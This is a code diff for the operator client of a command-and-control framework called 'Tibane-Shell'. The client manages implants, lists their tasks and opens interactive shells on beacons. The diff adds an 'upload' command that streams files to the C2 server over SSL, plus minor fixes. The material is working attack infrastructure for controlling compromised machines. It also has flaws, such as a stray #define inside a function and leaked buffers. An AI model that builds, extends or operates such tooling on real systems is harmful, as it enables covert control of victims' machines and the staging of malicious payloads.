@@ -37,6 +37,8 @@ extern "C" {
 #define MAX_SIZE 0x999999
 #define HELP_SIZE 0x400
 
+#define FILE_CHUNK 0x256
+
 char IP[BUFFER_SIZE];
 int PORT;
 char current_operator[BUFFER_SIZE];
@@ -49,6 +51,7 @@ const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
                                         "   list-tasks : shows all tasks for all implants\n"    
                                         "   beacon [id] : interactive shell for selected beacon\n"
                                         "   use [id] : same as beacon\n"
+                                        "   upload [file path] : upload file to server\n"
                                         "   quit, q, exit : exit the program\n"
                                         "   \n---------------------------------\n";
 
@@ -183,6 +186,57 @@ class Communicate_ {
 class SendInfo : public Communicate_ {
     public:
 
+    int upload(const char* path) {
+        cJSON *info = cJSON_CreateObject();
+        if (!info) {
+            return -1;
+        }
+        cJSON_AddStringToObject(info, "Info", "files");
+        //cJSON_AddStringToObject(info, "folder", "operator");
+        cJSON_AddStringToObject(info, "option", "upload");
+        char *info_ = cJSON_Print(info);
+        SSL_write(ssl, info_, strlen(info_));
+        free(info_);
+        cJSON_Delete(info);
+        
+
+        char *contents = (char*)malloc(MAX_SIZE);
+        cJSON *fileO = cJSON_CreateObject();
+        int file = open(path, O_RDONLY);
+        if (access(path, F_OK) != 0 || file == -1) {
+            return -1;
+        } else if (contents == NULL) {
+            cJSON_Delete(fileO);
+            return -1;
+        } else if (!fileO) {
+            free(contents);
+            return -1;
+        }
+
+        char filename[BUFFER_SIZE];
+        strncpy(filename, path, sizeof(filename));
+        cJSON_AddStringToObject(fileO, "file_name", filename);
+        printf("Filename : %s", filename);
+        char *Sfilename = cJSON_Print(fileO);
+        cJSON_Delete(fileO);
+        // send filename
+        SSL_write(ssl, Sfilename, strlen(Sfilename));
+        free(Sfilename);
+
+        size_t bytesRead;
+        while ((bytesRead = read(file, contents, FILE_CHUNK)) > 0) {
+            SSL_write(ssl, contents, bytesRead);
+            //send(sock, contents, bytesRead, 0);
+            //printf("%s\n", contents);
+        }
+        free(contents);
+        return 0;
+    }
+
+    int download() {
+        return 0;
+    }
+
     bool verify_id(const char* id) {
         cJSON *info = cJSON_CreateObject();
         if (!info) {
@@ -193,7 +247,7 @@ class SendInfo : public Communicate_ {
         char *info_ = cJSON_Print(info);
         //send(sock, info_, strlen(info_), 0);
         SSL_write(ssl, info_, strlen(info_));
-        
+        #define FILE_CHUNK 0x256
         cJSON_Delete(info);
         free(info_);
 
@@ -300,7 +354,6 @@ class RetriveInfo : public Communicate_ {
         }
         cJSON_AddStringToObject(info, "Info", table);
         char *info_ = cJSON_Print(info);
-        //send(sock, info_, strlen(info_), 0);
         SSL_write(ssl, info_, strlen(info_));
         cJSON_Delete(info);
         free(info_);
@@ -478,7 +531,7 @@ class Operator {
             } else if (strncmp(cmd, "new-task", 8) == 0) {
                 char task[BUFFER_SIZE];
                 if (sscanf(cmd, "new-task %s", task) != 1) {
-                    printf("\n[-] Failed to add task\n'n");
+                    printf("\n[-] Failed to add task\n");
                     continue;
                 }
                 sendinfo.new_task(id, task);
@@ -639,10 +692,10 @@ int main(int argc, char** argv) {
 // shell
 
 void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendinfo, Operator op) {
-    if (strncmp(cmd, "implants", 4) == 0) {
+    if (strncmp(cmd, "implants", sizeof("implants")) == 0) {
         char* data = recvinfo.get_info("Implants");
         if (!data) {
-            printf("\n[-] NO DATA ABOUT IMPLANTS \n\n");
+            printf("\n[-] NO DATA ABOUT IMPLANTS \n");
             return;
         }
         //displayinfo.display_all_agents(data);
@@ -650,9 +703,8 @@ void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendi
         free(data);
     } 
     else if (strncmp(cmd, "exit", 4) == 0 || strncmp(cmd, "quit", 4) == 0 || strncmp(cmd, "q", 1) == 0) {
-        printf("\n[-] Exiting \n\n");
+        printf("\n[-] Exiting \n");
         sendinfo.Quit();
-        sleep(1);
         exit(0);
     }
     else if (strncmp(cmd, "beacon", 6) == 0 || strncmp(cmd, "use", 3) == 0) {
@@ -669,22 +721,35 @@ void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendi
         if (sscanf(cmd, "list-tasks %s", id) != 1) {
             char* data = recvinfo.get_info("Tasks");
             if (!data) {
-                printf("\n[-] NO DATA About Tasks\n \n");
+                printf("\n[-] NO DATA About Tasks\n");
+                return;
             }
             DisplayAllTasks(data);
             free(data);
         } else {
             char* data = recvinfo.list_tasks(id);
             if (!data) {
-                printf("\n [-] NO DATA RELATED TO TASKS FOR %s \n\n", id);
+                printf("\n[-] NO DATA RELATED TO TASKS FOR %s \n", id);
                 free(data);
+                return;
             }
             DisplayTasksPerAgent(data);
             free(data);
         }
     } else if (strncmp(cmd, "whoami", 6) == 0) {
         printf("\n%s\n", current_operator);
-    }   else {
+    }  else if (strncmp(cmd, "upload", 6) == 0) {
+        char file_path[BUFFER_SIZE];
+        //if (sscanf(cmd, "upload %s", file_path) != 1) {
+        //    printf("\n[-] Use : upload [file path]\n");
+        //    return;
+        //}
+        strncpy(file_path, cmd + 7, sizeof(file_path));
+        if (sendinfo.upload(file_path) == -1) {
+            printf("\n[-] Could Not Send File\n");
+            return;
+        }  
+    } else {
         printf("%s", tibane_shell_help);
     }
 }
@@ -698,7 +763,7 @@ char** shell_completion(const char* text, int start, int end) {
 
 char* command_generator(const char* text, int state) {
     static const char* commands[] = {
-        "implants", "beacon", "list-tasks", "whoami", "exit", "quit", "q", "use", NULL
+        "implants", "beacon", "list-tasks", "whoami", "upload", "exit", "quit", "q", "use", NULL
     };
     
     static int list_index, len;
